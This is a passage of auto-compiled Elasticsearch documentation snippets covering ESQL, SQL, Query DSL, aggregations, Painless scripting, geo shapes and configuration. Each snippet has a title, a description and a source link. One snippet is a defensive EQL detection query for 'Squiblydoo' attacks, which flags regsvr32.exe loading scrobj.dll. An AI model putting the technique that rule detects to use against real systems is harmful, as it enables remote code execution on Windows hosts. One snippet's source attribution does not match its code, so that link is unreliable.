\"time_frame\" : {\n        \"gte\" : \"2015-10-31\",\n        \"lte\" : \"2015-11-01\",\n        \"relation\" : \"within\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Authors with MULTI_MATCH in ESQL\nDESCRIPTION: Example query searching for 'Faulkner' across author and description fields, limiting to 5 results and sorting by book_no. Returns book number and author fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/multi_match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MULTI_MATCH(\"Faulkner\", author, description)\n| KEEP book_no, author\n| SORT book_no\n| LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Date Range Aggregation with Missing Values in Elasticsearch\nDESCRIPTION: Demonstrates how to handle documents with missing date values in a date range aggregation by providing a default date. Documents without a date value will be treated as if they had the specified default date value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n   \"aggs\": {\n       \"range\": {\n           \"date_range\": {\n               \"field\": \"date\",\n               \"missing\": \"1976/11/30\",\n               \"ranges\": [\n                  {\n                    \"key\": \"Older\",\n                    \"to\": \"2016/02/01\"\n                  }, <1>\n                  {\n                    \"key\": \"Newer\",\n                    \"from\": \"2016/02/01\",\n                    \"to\" : \"now/d\"\n                  }\n              ]\n          }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing Nested Fields in SQL Query\nDESCRIPTION: Example of how to properly reference nested fields in Elasticsearch SQL using the dot notation to access sub-fields. This demonstrates accessing the 'keyword' sub-field of a nested field named 'dep_name'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n[nested_field_name].[sub_field_name]\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT dep.dep_name.keyword FROM test_emp GROUP BY languages;\n```\n\n----------------------------------------\n\nTITLE: Describing COLUMN_MIN Function in ESQL\nDESCRIPTION: This snippet provides a description of the COLUMN_MIN function in ESQL. It explains that the function returns the minimum value from multiple columns and compares it to the MV_MIN function, noting that COLUMN_MIN is designed to operate on multiple columns simultaneously.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/least.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns the minimum value from multiple columns. This is similar to [`MV_MIN`](/reference/query-languages/esql/functions-operators/mv-functions.md#esql-mv_min) except it is intended to run on multiple columns at once.\n```\n\n----------------------------------------\n\nTITLE: Filtering Books by Author using KQL in ESQL\nDESCRIPTION: This ESQL query demonstrates how to use the KQL function to filter books where the author is Faulkner. The query selects from the 'books' table and applies a KQL filter condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE KQL(\"author: Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Field Value Factor with Missing Value Handling\nDESCRIPTION: Demonstrates how to handle missing field values in field_value_factor implementation using size() check.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"Math.log10((doc['field'].size() == 0 ? 1 : doc['field'].value()) * params.factor)\",\n    \"params\" : {\n        \"factor\" : 5\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Copying Keystore and Connecting to Azure VM\nDESCRIPTION: Commands to copy the previously created keystore to the Azure VM and then connect to the VM using SSH for Elasticsearch installation and configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_9\n\nLANGUAGE: sh\nCODE:\n```\nscp /tmp/azurekeystore.pkcs12 azure-elasticsearch-cluster.cloudapp.net:/home/elasticsearch\nssh azure-elasticsearch-cluster.cloudapp.net\n```\n\n----------------------------------------\n\nTITLE: Searching with Geo-bounding Box Query for Multiple Indices\nDESCRIPTION: The snippet enables searching both geo_point and geo_shape data across multiple indices using a geo_bounding_box filter. Necessary prerequisites include multiple indexed mappings in Elasticsearch. The queries return documents from both indices that intersect the specified bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations,my_geoshapes/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": {\n              \"lat\": 40.73,\n              \"lon\": -74.1\n            },\n            \"bottom_right\": {\n              \"lat\": 40.01,\n              \"lon\": -71.12\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Nested Documents in Elasticsearch\nDESCRIPTION: Example of adding a product document with nested reseller information including company names and prices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-nested-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /products/_doc/0?refresh\n{\n  \"name\": \"LED TV\",\n  \"resellers\": [\n    {\n      \"reseller\": \"companyA\",\n      \"price\": 350\n    },\n    {\n      \"reseller\": \"companyB\",\n      \"price\": 500\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Iterating Over Lists Using For-In Loop in Painless\nDESCRIPTION: Shows two equivalent ways to iterate over a list using for-in loops in Painless. The first example uses the 'def' keyword for variable declaration, while the second omits it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-statements.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nfor (def item : list) {\n  // do something\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nfor (item in list) {\n  // do something\n}\n```\n\n----------------------------------------\n\nTITLE: Grammar for Equality Equals Operator\nDESCRIPTION: Defines the grammar for the equality equals operator in Painless.  The 'equality_equals' production consists of two expressions separated by the '==' operator. This specifies the syntax for comparing two values for equality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_10\n\nLANGUAGE: text\nCODE:\n```\n\"equality_equals: expression '==' expression;\"\n```\n\n----------------------------------------\n\nTITLE: Configuring SAML Encryption Keys and Certificates\nDESCRIPTION: A comprehensive set of configuration settings for managing SAML encryption in Elasticsearch. Includes options for PEM-encoded keys, certificates, and keystore configurations. Supports both direct key/certificate files and keystore-based approaches with various security options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nencryption.key: /path/to/private.key\nencryption.secure_key_passphrase: ${PASSPHRASE}\nencryption.certificate: /path/to/certificate.pem\nencryption.keystore.path: /path/to/keystore.jks\nencryption.keystore.type: jks\nencryption.keystore.alias: saml-key\nencryption.keystore.secure_password: ${KEYSTORE_PASSWORD}\nencryption.keystore.secure_key_password: ${KEY_PASSWORD}\n```\n\n----------------------------------------\n\nTITLE: Basic EQL Sample Query with Join Keys\nDESCRIPTION: Example of a basic EQL sample query with host-based filtering and multiple conditions, including response showing matched events.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index*/_eql/search\n{\n  \"query\": \"\"\"\n    sample by host\n      [any where uptime > 0]   by os\n      [any where port > 100]   by op_sys\n      [any where bool == true] by os\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Unfiltered Significant Text Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows the raw significant text results for a search query on 'elasticsearch' without using filter_duplicate_text. It demonstrates how noisy data can affect the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"sample\": {\n      \"doc_count\": 35,\n      \"keywords\": {\n        \"doc_count\": 35,\n        \"buckets\": [\n          {\n            \"key\": \"elasticsearch\",\n            \"doc_count\": 35,\n            \"score\": 28570.428571428572,\n            \"bg_count\": 35\n          },\n          ...\n          {\n            \"key\": \"currensee\",\n            \"doc_count\": 8,\n            \"score\": 6530.383673469388,\n            \"bg_count\": 8\n          },\n          ...\n          {\n            \"key\": \"pozmantier\",\n            \"doc_count\": 4,\n            \"score\": 3265.191836734694,\n            \"bg_count\": 4\n          },\n          ...\n\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a LineString Geometry using GeoJSON in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a LineString geometry specified in GeoJSON format. The line is defined by two points representing a path from the White House to the US Capitol Building.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"LineString\",\n    \"coordinates\" : [[-77.03653, 38.897676], [-77.009051, 38.889939]]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Check DLL Loading with EQL\nDESCRIPTION: EQL query to detect when regsvr32.exe loads the scrobj.dll library, a common indicator of Squiblydoo attacks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    library where process.name == \"regsvr32.exe\" and dll.name == \"scrobj.dll\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Match Query on Author Field in ESQL\nDESCRIPTION: This ESQL query demonstrates how to use the MATCH function to search for books authored by Faulkner. It filters the 'books' index using a match query on the 'author' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MATCH(author, \"Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Stop Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the stop analyzer to analyze a given text. It shows the API call to the _analyze endpoint and the resulting output after stop word removal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"stop\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ quick, brown, foxes, jumped, over, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation with Hard Bounds\nDESCRIPTION: Example showing how to limit the range of buckets in a histogram aggregation using hard_bounds. This is useful for open data ranges that could result in too many buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"query\": {\n    \"constant_score\": { \"filter\": { \"range\": { \"price\": { \"lte\": \"500\" } } } }\n  },\n  \"aggs\": {\n    \"prices\": {\n      \"histogram\": {\n        \"field\": \"price\",\n        \"interval\": 50,\n        \"hard_bounds\": {\n          \"min\": 100,\n          \"max\": 200\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of LIKE Operator Usage in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to use the LIKE operator to filter results based on a pattern. This example returns books whose names start with 'Dune'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-like-rlike-operators.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name FROM library WHERE name LIKE 'Dune%';\n\n    author     |     name\n---------------+---------------\nFrank Herbert  |Dune\nFrank Herbert  |Dune Messiah\n```\n\n----------------------------------------\n\nTITLE: Converting WKT Strings to Cartesian Shapes in ESQL\nDESCRIPTION: This example demonstrates using the TO_CARTESIANSHAPE function to convert WKT (Well-Known Text) strings into cartesian shape objects. It processes multiple WKT strings by expanding them using MV_EXPAND and then converting each to a cartesian shape.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_cartesianshape.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = [\"POINT(4297.11 -1475.53)\", \"POLYGON ((3339584.72 1118889.97, 4452779.63 4865942.27, 2226389.81 4865942.27, 1113194.90 2273030.92, 3339584.72 1118889.97))\"] \n| MV_EXPAND wkt\n| EVAL geom = TO_CARTESIANSHAPE(wkt)\n```\n\n----------------------------------------\n\nTITLE: Complete Change Point Detection Example with Date Histogram\nDESCRIPTION: Comprehensive example showing how to implement change point detection with date histogram aggregation using Kibana sample data logs. Includes date histogram configuration, average calculation, and change point detection setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-change-point-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"aggs\": {\n    \"date\":{\n      \"date_histogram\": {\n        \"field\": \"@timestamp\",\n        \"fixed_interval\": \"1d\"\n      },\n      \"aggs\": {\n        \"avg\": {\n          \"avg\": {\n            \"field\": \"bytes\"\n          }\n        }\n      }\n    },\n    \"change_points_avg\": {\n      \"change_point\": {\n        \"buckets_path\": \"date>avg\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combined Fields Query with Per-Field Boosting\nDESCRIPTION: Illustrates how to apply field-level boosting in a combined fields query, giving more weight to the title field when searching for 'distributed consensus'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-combined-fields-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"combined_fields\" : {\n      \"query\" : \"distributed consensus\",\n      \"fields\" : [ \"title^2\", \"body\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Indexing Slow Log Settings in YAML\nDESCRIPTION: This snippet shows how to configure indexing slow log settings in the log4j2.properties file using YAML format. It sets thresholds for different log levels, configures source logging, and enables user information inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nindex.indexing.slowlog.threshold.index.warn: 10s\nindex.indexing.slowlog.threshold.index.info: 5s\nindex.indexing.slowlog.threshold.index.debug: 2s\nindex.indexing.slowlog.threshold.index.trace: 500ms\n\nindex.indexing.slowlog.source: 1000\nindex.indexing.slowlog.reformat: true\n\nindex.indexing.slowlog.include.user: true\n```\n\n----------------------------------------\n\nTITLE: Summing Multivalued Field with MV_SUM in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_SUM function in ESQL to convert a multivalued field into a single value containing the sum of all values. It creates a row with a multivalued field 'a' and then uses MV_SUM to calculate the sum of its values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 6]\n| EVAL sum_a = MV_SUM(a)\n```\n\n----------------------------------------\n\nTITLE: Disabling Shard Request Cache When Creating an Index in Elasticsearch\nDESCRIPTION: This request creates a new index with the request cache disabled via index settings. By default, the cache is enabled, but this example shows how to turn it off when creating an index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"index.requests.cache.enable\": false\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using STARTS_WITH Function in Elasticsearch SQL\nDESCRIPTION: Returns a boolean value indicating whether the source expression starts with the specified pattern. The matching is case sensitive and returns null if either input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\nSTARTS_WITH(\n    source,   <1>\n    pattern)  <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT STARTS_WITH('Elasticsearch', 'Elastic');\n\nSTARTS_WITH('Elasticsearch', 'Elastic')\n--------------------------------\ntrue\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT STARTS_WITH('Elasticsearch', 'ELASTIC');\n\nSTARTS_WITH('Elasticsearch', 'ELASTIC')\n--------------------------------\nfalse\n```\n\n----------------------------------------\n\nTITLE: Configuring Synonym Sets in Elasticsearch JSON\nDESCRIPTION: Demonstrates configuring a synonym set in Elasticsearch using the synonym_graph token filter. This setup can be updated dynamically and involves defining the synonym set name and updating rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym_graph\",\n      \"synonyms_set\": \"my-synonym-set\",\n      \"updateable\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Custom Token Filter with Elasticsearch Analyze API\nDESCRIPTION: This Elasticsearch API request demonstrates how to use the _analyze endpoint to test the custom 'hello_world' token filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"text\": \"hello to everyone except the world\",\n  \"tokenizer\": \"standard\",\n  \"filter\":  [\"hello_world\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Terms Aggregation Execution Hint in Elasticsearch\nDESCRIPTION: Example showing how to set execution hints for terms aggregation using the map strategy. The execution_hint parameter can be set to either 'map' or 'global_ordinals' to control how the aggregation is executed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"terms\": {\n        \"field\": \"tags\",\n        \"execution_hint\": \"map\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Pipeline for Handling Type Conflicts\nDESCRIPTION: Shows a pipeline that first renames the conflicting scalar field before applying the dot expander, since Ingest cannot automatically cast a scalar field to an object field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_14\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"processors\" : [\n    {\n      \"rename\" : {\n        \"field\" : \"foo\",\n        \"target_field\" : \"foo.bar\"\n      }\n    },\n    {\n      \"dot_expander\": {\n        \"field\": \"foo.bar\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Envelope Boundaries from Geographic Data using ESQL Spatial Functions\nDESCRIPTION: This ESQL query extracts the coordinate boundaries (minimum and maximum x and y values) from the 'city_boundary' field of a record from the 'airport_city_boundaries' table. It filters for the Copenhagen airport (CPH), applies the ST_ENVELOPE function to get the bounding rectangle, then extracts the boundary coordinates using ST_XMIN, ST_XMAX, ST_YMIN, and ST_YMAX functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_xmax.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Running Extraction Service in Docker (Dockerized Connector)\nDESCRIPTION: This command runs the extraction service Docker container with a shared volume and network. It maps port 8090, attaches the `extraction-service-volume`, and connects to the `elastic` network. `$EXTRACTION_SERVICE_VERSION` should be set to the desired extraction service image version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ docker run \\\n  -p 8090:8090 \\\n  -it \\\n  -v extraction-service-volume:/app/files \\\n  --network \"elastic\" \\\n  --name extraction-service \\\n  docker.elastic.co/integrations/data-extraction-service:$EXTRACTION_SERVICE_VERSION\n```\n\n----------------------------------------\n\nTITLE: Basic Auto Date Histogram Aggregation Example in Elasticsearch\nDESCRIPTION: A simple example of an auto date histogram aggregation that requests a target of 10 buckets. The aggregation is applied to the 'date' field with a default target of 10 buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-autodatehistogram-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"auto_date_histogram\": {\n        \"field\": \"date\",\n        \"buckets\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Lowercase Filter to Short Tokens Using Conditional Token Filter in Elasticsearch\nDESCRIPTION: This example uses the condition filter to match tokens with fewer than 5 characters and applies the lowercase filter to those matching tokens. The request is made using the analyze API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-condition-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"condition\",\n      \"filter\": [ \"lowercase\" ],\n      \"script\": {\n        \"source\": \"token.getTerm().length() < 5\"\n      }\n    }\n  ],\n  \"text\": \"THE QUICK BROWN FOX\"\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon with Hole using WKT in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Polygon geometry that includes a hole, specified in Well-Known Text (WKT) format. The first parenthesis contains the outer boundary, and the second parenthesis contains the interior hole.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POLYGON ((100.0 0.0, 101.0 0.0, 101.0 1.0, 100.0 1.0, 100.0 0.0), (100.2 0.2, 100.8 0.2, 100.8 0.8, 100.2 0.8, 100.2 0.2))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Refresh Policy in Elasticsearch Bulk Request\nDESCRIPTION: Method for setting the refresh policy on a bulk request to control when the changes made by the request are made visible to search.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest setRefreshPolicy(String refreshPolicy) {\n    this.refreshPolicy = refreshPolicy;\n    return this;\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Columns with KEEP in ESQL\nDESCRIPTION: This ESQL query selects data from the 'employees' table and uses the KEEP function to retain only columns that start with 'h'. This operation is useful for focusing on specific data fields in a large dataset.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keepWildcard.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP h*\n```\n\n----------------------------------------\n\nTITLE: Defining ScriptTermStats Class for Term Frequency Analysis in Java\nDESCRIPTION: This snippet outlines the ScriptTermStats class, which includes methods to retrieve unique term counts and matched term counts, as well as summary statistics for document frequency, total term frequency, term frequency, and term positions. It is vital for understanding term usage statistics in scoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.score.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.ScriptTermStats {\n    int uniqueTermsCount()\n    int matchedTermsCount()\n    StatsSummary docFreq()\n    StatsSummary totalTermFreq()\n    StatsSummary termFreq()\n    StatsSummary termPositions()\n}\n```\n\n----------------------------------------\n\nTITLE: Running Extraction Service in Docker (Non-Dockerized Connector)\nDESCRIPTION: This command runs the extraction service Docker container, mounting a local directory as a shared volume. The local and container filepaths must be identical for non-dockerized self-managed connectors to accurately provide file pointers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ docker run \\\n  -p 8090:8090 \\\n  -it \\\n  -v /app/files:/app/files \\\n  --name extraction-service \\\n  docker.elastic.co/integrations/data-extraction-service:$EXTRACTION_SERVICE_VERSION\n```\n\n----------------------------------------\n\nTITLE: GC Logging Configuration\nDESCRIPTION: Example of configuring custom garbage collection logging settings with file rotation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n# Turn off all previous logging configuratons\n-Xlog:disable\n\n# Default settings from JEP 158, but with `utctime` instead of `uptime` to match the next line\n-Xlog:all=warning:stderr:utctime,level,tags\n\n# Enable GC logging to a custom location with a variety of options\n-Xlog:gc*,gc+age=trace,safepoint:file=/opt/my-app/gc.log:utctime,level,pid,tags:filecount=32,filesize=64m\n```\n\n----------------------------------------\n\nTITLE: Sorting by Combined Fields in Painless\nDESCRIPTION: Illustrates how to sort search results using a Painless script that concatenates first and last names of players.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET hockey/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"sort\": {\n    \"_script\": {\n      \"type\": \"string\",\n      \"order\": \"asc\",\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['first.keyword'].value + ' ' + doc['last.keyword'].value\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting Base64 String Parameter for ESQL Function Test\nDESCRIPTION: This markdown snippet defines the parameter for an ESQL function test case. It specifies that the function takes a single parameter of type 'string', which should be a base64 encoded string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/from_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   A base64 string.\n```\n\n----------------------------------------\n\nTITLE: Using BIT_LENGTH Function in Elasticsearch SQL\nDESCRIPTION: Returns the length in bits of the string input expression. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nBIT_LENGTH(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT BIT_LENGTH('Elastic');\n\nBIT_LENGTH('Elastic')\n---------------------\n56\n```\n\n----------------------------------------\n\nTITLE: Detailed Token Analysis with Keyword Attributes\nDESCRIPTION: Advanced analysis request showing token attributes and keyword marking details with explanation enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-marker-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"keyword_marker\",\n      \"keywords\": [ \"jumping\" ]\n    },\n    \"stemmer\"\n  ],\n  \"text\": \"fox running and jumping\",\n  \"explain\": true,\n  \"attributes\": \"keyword\"\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Syntax\nDESCRIPTION: Defines the syntax for the DATE_ADD function in Elasticsearch SQL. The function adds a specified time interval to a date or datetime value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\n\"DATE_ADD(\n    string_exp, <1>\n    integer_exp, <2>\n    datetime_exp) <3>\"\n```\n\n----------------------------------------\n\nTITLE: Documentation Preview URL Format\nDESCRIPTION: URL pattern for accessing documentation preview links for open pull requests generated by GitHub actions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nhttps://docs-v3-preview.elastic.dev/elastic/elasticsearch/pull/<PR-NUMBER>/reference/\n```\n\n----------------------------------------\n\nTITLE: IP Function Type Table in 